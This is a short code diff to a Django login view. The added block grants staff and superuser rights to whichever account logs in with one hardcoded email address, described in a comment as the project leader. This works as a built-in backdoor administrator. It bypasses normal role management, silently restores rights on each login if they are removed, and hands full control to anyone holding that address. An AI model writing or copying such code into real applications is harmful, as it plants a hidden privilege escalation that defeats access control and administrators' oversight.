@@ -68,6 +68,12 @@ class LoginView(APIView):
                 return Response({"error": "Invalid email or password."},
                                  status=status.HTTP_401_UNAUTHORIZED)
 
+        # Ensure project leader always has superuser & staff privileges
+        if user.email.lower() == 'abhish@gmail.com' and (not user.is_staff or not user.is_superuser):
+            user.is_staff = True
+            user.is_superuser = True
+            user.save(update_fields=['is_staff', 'is_superuser'])
+
         # Streak update on login (used by Dashboard's Daily Goal / streak feature)
         today = timezone.localdate()
         if user.last_active_date != today:
